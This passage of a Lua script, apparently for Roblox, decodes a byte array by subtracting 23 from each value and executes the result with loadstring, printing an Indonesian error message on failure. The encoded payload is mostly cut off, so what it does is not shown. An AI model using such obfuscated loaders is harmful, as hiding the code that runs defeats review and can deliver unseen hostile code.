55, 124, 133, 123, 64, 55, 124, 133, 123, 64, 33}
local k = 23
local s = ""
for i = 1, #d do
    s = s .. string.char(d[i] - k)
end
local func, err = loadstring(s)
if func then
    func()
else
    warn("Gagal menjalankan script: ", err)
end
